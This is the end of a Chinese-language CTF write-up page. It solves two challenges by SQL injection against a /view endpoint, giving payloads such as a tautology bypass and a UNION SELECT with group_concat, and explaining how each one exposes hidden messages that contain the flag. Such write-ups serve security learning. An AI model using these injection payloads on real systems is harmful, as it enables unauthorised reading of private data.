+<p>这是我比赛时的做题顺序，接下来也按照这个顺序，只用<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入。</p>
+<h3 id="_12">窥视未知<a class="headerlink" href="#_12" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>在 <code>/list</code> 中，<span>SQL<span class="heti-spacing"> </span></span>查询限制了只显示 <code>shown = true</code> 的对话：</p>
+<div class="highlight"><pre><span></span><code><span class="n">results</span> <span class="o">=</span> <span class="n">execute_query</span><span class="p">(</span>
+    <span class="s2">"select id, title from messages where shown = true"</span><span class="p">,</span> <span class="n">fetch_all</span><span class="o">=</span><span class="kc">True</span>
+<span class="p">)</span>
+</code></pre></div>
+<p>但在 <code>/view</code> 中存在<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入漏洞，我们可以构造<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>绕过这个限制：</p>
+<div class="highlight"><pre><span></span><code>' or shown = false --
+</code></pre></div>
+<p>这个<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>会使<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>语句变为：</p>
+<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">messages</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">shown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="c1">--'</span>
+</code></pre></div>
+<p>这样查询条件就从匹配特定<span class="heti-skip"><span class="heti-spacing"> </span>ID<span class="heti-spacing"> </span></span>变成了获取所有 <code>shown = false</code> 的对话。</p>
+<p>由于 <code>execute_query()</code> 默认只返回一条记录，所以这个方法仅在隐藏对话只有一篇时有效。</p>
+<p>经过测试，数据库中确实只有一篇隐藏对话，其内容底部包含<span><span class="heti-spacing"> </span>Flag</span>。</p>
+<p>如果数据库中有多篇隐藏对话，那么可以使用 <code>like</code> 语句匹配包含 <code>flag</code> 的结果：</p>
+<div class="highlight"><pre><span></span><code>' or shown = false and contents like '%flag%'' --
+</code></pre></div>
+<h3 id="_13">千里挑一<a class="headerlink" href="#_13" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>构造以下<span><span class="heti-spacing"> </span>Payload</span>：</p>
+<div class="highlight"><pre><span></span><code>' union select 1, group_concat(title, contents) from messages --
+</code></pre></div>
+<p>这个<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>会使<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>语句变为：</p>
+<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">messages</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span>
+<span class="k">union</span>
+<span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">contents</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">messages</span><span class="w"> </span><span class="c1">--'</span>
+</code></pre></div>
+<ul>
+<li>第一个 <code>select</code> 由于<span class="heti-skip"><span class="heti-spacing"> </span>id<span class="heti-spacing"> </span></span>为空字符串，不会返回任何结果</li>
+<li><code>union</code> 连接了第二个 <code>select</code>，它会返回所有对话的内容</li>
+<li>使用 <code>group_concat()</code> 将所有记录合并成一行，这样就能绕过 <code>execute_query()</code> 只返回一条记录的限制</li>
+<li>添加了第一列 <code>1</code> 是为了满足 <code>union</code> 两边列数相同的要求</li>
+</ul>
+<p>执行后会获得数据库中所有对话的标题和内容，在返回的页面中搜索 <code>flag</code> 就能同时找到两题的<span><span class="heti-spacing"> </span>Flag</span>。</p>
+<h2 id="other">Other...<a class="headerlink" href="#other" title="Permanent link">¶</a></h2>
+<p>todo!()</p>
+<aside class="md-source-file">
+<span class="md-source-file__fact">
+<span class="md-icon" title="最后更新">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年2月18日 17:16:47</span>
+</span>
+<span class="md-source-file__fact">
+<span class="md-icon" title="创建日期">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
+</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年2月18日 17:16:47</span>
+</span>
+</aside>
+</article>
+</div>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  回到页面顶部
+</button>
+</main>
+<footer class="md-footer">
+<nav aria-label="页脚" class="md-footer__inner md-grid">
+<a aria-label="上一页: Writeups" class="md-footer__link md-footer__link--prev" href="../index.html">
+<div class="md-footer__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</div>
+<div class="md-footer__title">
+<span class="md-footer__direction">
+                上一页
+              </span>
+<div class="md-ellipsis">
+                Writeups
+              </div>
+</div>
+</a>
+<a aria-label="下一页: DiceCTF 2024 Quals" class="md-footer__link md-footer__link--next" href="dicectf2024_quals.html">
+<div class="md-footer__title">
+<span class="md-footer__direction">
+                下一页
+              </span>
+<div class="md-ellipsis">
+                DiceCTF 2024 Quals
+              </div>
+</div>
+<div class="md-footer__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
+</div>
+</a>
+</nav>
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+<div class="md-copyright__highlight">
+        Copyright © 2024-2025 <a href="https://github.com/13m0n4de" rel="noopener" target="_blank">13m0n4de</a>
+</div>
+    
+    
+    Powered by
+    <a href="https://www.mkdocs.org/" rel="noopener" target="_blank">
+        MkDocs
+    </a>
+    with theme
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+        Material
+    </a>
+    modified by
+    <a href="https://github.com/13m0n4de" rel="noopener" target="_blank">
+        13m0n4de
+    </a>
+</div>
+<div class="md-social">
+<a class="md-social__link" href="https://github.com/13m0n4de/" rel="noopener" target="_blank" title="github.com">
+<svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
+</a>
+<a class="md-social__link" href="https://13m0n4de.vercel.app/blog/" rel="noopener" target="_blank" title="13m0n4de.vercel.app">
+<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M192 32c0 17.7 14.3 32 32 32 123.7 0 224 100.3 224 224 0 17.7 14.3 32 32 32s32-14.3 32-32C512 128.9 383.1 0 224 0c-17.7 0-32 14.3-32 32m0 96c0 17.7 14.3 32 32 32 70.7 0 128 57.3 128 128 0 17.7 14.3 32 32 32s32-14.3 32-32c0-106-86-192-192-192-17.7 0-32 14.3-32 32m-96 16c0-26.5-21.5-48-48-48S0 117.5 0 144v224c0 79.5 64.5 144 144 144s144-64.5 144-144-64.5-144-144-144h-16v96h16c26.5 0 48 21.5 48 48s-21.5 48-48 48-48-21.5-48-48z"></path></svg>
+</a>
+<a class="md-social__link" href="https://13m0n4de.vercel.app" rel="noopener" target="_blank" title="13m0n4de.vercel.app">
+<svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1v16.2c0 22.1-17.9 40-40 40h-16c-1.1 0-2.2 0-3.3-.1-1.4.1-2.8.1-4.2.1L416 512h-24c-22.1 0-40-17.9-40-40v-88c0-17.7-14.3-32-32-32h-64c-17.7 0-32 14.3-32 32v88c0 22.1-17.9 40-40 40h-55.9c-1.5 0-3-.1-4.5-.2-1.2.1-2.4.2-3.6.2h-16c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9.1-2.8v-69.7h-32c-18 0-32-14-32-32.1 0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7l255.4 224.5c8 7 12 15 11 24"></path></svg>
+</a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<div class="md-progress" data-md-component="progress" role="progressbar"></div>
+<script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.indexes", "navigation.top", "navigation.tabs", "navigation.footer", "search.suggest", "content.code.annotate", "content.code.copy", "content.footnote.tooltips"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+<script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
+<script src="../../javascripts/katex.js"></script>
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
